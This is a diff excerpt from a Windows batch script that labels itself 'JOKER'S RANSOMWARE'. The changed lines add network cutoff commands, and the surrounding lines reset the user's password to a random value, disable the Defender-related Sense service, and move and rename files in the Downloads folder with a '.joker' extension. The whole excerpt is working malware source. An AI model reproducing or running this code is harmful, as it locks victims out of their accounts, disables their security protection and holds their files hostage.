@@ -76,7 +76,9 @@ if not "%~nx0" == "%filename%" (
   exit /b
 )
 
-
+ipconfig /flushdns
+Ipconfig /release
+::change ip, and release it
 net user %username% %random%                        
 ::change windows password randomly
 sc config Sense start= disabled > NUL 2>&1          
@@ -296,7 +298,8 @@ move %userprofile%\downloads\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\d
 copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\*.joker*      
 ::end
 cls
-title JOKER'S RANSOMWARE                      ::set title
+title JOKER'S RANSOMWARE                      
+::set t.itle
 ECHO  ■■■■■                  ■■■                  ■    ■■                ■■■■■                ■■■■
 ECHO      ■                    ■      ■                ■  ■                    ■                        ■      ■
 ECHO      ■                    ■      ■                ■■                      ■■■■                  ■■■■
